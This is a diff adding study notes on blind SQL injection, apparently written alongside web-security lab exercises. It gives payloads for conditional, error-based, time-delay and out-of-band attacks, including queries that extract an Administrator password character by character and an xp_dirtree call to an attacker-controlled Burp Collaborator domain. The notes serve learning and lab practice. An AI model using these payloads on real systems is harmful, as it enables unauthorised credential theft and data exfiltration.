@@ -356,3 +356,98 @@ etc.
   will output:
   `admin~iusafhdgbiaus1238asdf`
   `user1~testpw`
+
+
+  ## Blind SQL Injection
+
+  - If HTTP response does not contain the result of SQL query ( the result is not visable on the screen), Blind SQL Injection is used
+  - 4 different techniques for Blind SQL
+    1) Triggering conditional responses
+    2) Error-based SQL Injection
+    3) SQL Injection by triggering tme delays
+    4) SQL Injection using out-of-band techniques
+
+
+---
+
+###  Triggering conditional responses
+
+- HTTP stores Cookies
+  -> `TrackingID` to detect if the user is known or not
+-> Some pages return different data if user is already known
+- Triggering different responses conditionally can retrieve information
+
+**Example:**
+```
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+```
+
+First request is true, so user is known and user specific information like a "Welcome back" will be displayed
+Second request if alse, so user is unknown and no info gets revealed
+- Using this info `TrackingID` can be manipulated to get the password of an user
+
+```
+...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+-> Checks if the first char in the password from user: Administrator is greather then `m`
+--> Possible to brute force pw with payloads 
+
+
+How the attack works:
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+Attack also gives a boolean condition -> if its true it'll evaluate to `a`, if it fails it will devide 1 with 0 -> which causes a divide-by-zero-exception
+As an example: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+
+Lab 1: Blind SQL injection with conditional responses
+
+---
+
+### Error-based SQL Injection
+
+BAsically works the same way as conditional responses but reverse.
+-> Get specific error responses based on boolean expresion
+
+How the attack works:
+```
+CAST((SELECT example_column FROM example_table) AS int)
+```
+-> CAST tries to convert datatype into an int -> Error output could be following: 
+
+```
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+---
+
+### SQL Injection by triggering tme delays
+
+Sometimes application databases cathces errors and there won't be a difference in the response.
+Still it is exploitable when working with time delays
+SQL queries normally processed synchronously -> delaying the execution of the query also delays the HTTP response
+--> Using another boolean expression will give the query a delay, so the attacker knows when it is true/false
+```
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+Example:
+`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+---
+
+### SQL Injection using out-of-band techniques
+
+Most commonly used Blind SQL atack since it will work where the others will not work
+Goal: Trigger out-of-band network interactions to a system the attacker is controlling
+-> Use network protocols like DNS and tools like Burp Collaborator (server providing custom implementations of various network services)
+- Detects when network interactions occur as a result of sending individual payloads to vulnerable application
+
+Example:
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+-> Database lookup the domain: //0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
